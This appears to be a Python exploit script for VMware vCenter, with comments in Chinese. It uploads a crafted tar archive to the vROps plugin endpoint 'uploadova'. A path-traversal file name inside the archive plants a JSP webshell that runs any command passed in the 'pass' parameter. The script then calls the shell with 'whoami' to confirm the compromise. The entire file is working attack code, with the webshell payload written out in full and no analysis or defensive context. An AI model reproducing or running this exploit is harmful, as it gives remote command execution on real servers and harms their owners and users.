from io import BytesIO
import tarfile
import requests
# 不对证书进行验证，并忽略警告requests的警告
# 设置代理信息
def run(rhost):
    return_zip()
    proxies = {
        "http": "http://127.0.0.1:1080",
        "https": "http://127.0.0.1:1080",
    }
    files = {'uploadFile': open('plugin/test.tar', 'rb')}
    try:
        requests.packages.urllib3.disable_warnings()
        url = rhost + "/ui/vropspluginui/rest/services/uploadova"
        resp= requests.post(url=url,files=files,verify = False).text
        #print(resp)
        status= requests.post(url=rhost+"/statsreport/test1.jsp?pass=whoami",verify = False).status_code
        #print(status)
        if status == 200:
            print("webshell写入成功！位于"+ rhost +"/statsreport/test1.jsp?pass=whoami")
            return True
        else:
            return False
    except:
        return False

def return_zip():
    with tarfile.open("plugin/test.tar", 'w') as tar:
        payload = BytesIO()
        id_rsa_pub='<% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("pass")).getInputStream();int a = -1;byte[] b = new byte[2048];while((a=in.read(b))!=-1){out.println(new String(b));}  %>'
        tarinfo = tarfile.TarInfo(name='..\\..\\ProgramData\\VMware\\vCenterServer\\data\\perfcharts\\tc-instance\\webapps\\statsreport\\test1.jsp')
        f1 = BytesIO(id_rsa_pub.encode())
        tarinfo.size = len(f1.read())
        f1.seek(0)
        tar.addfile(tarinfo, fileobj=f1)
        tar.close()
        payload.seek(0)


if __name__ == '__main__':

    run("https://xxx.xxx.xxx.xxx")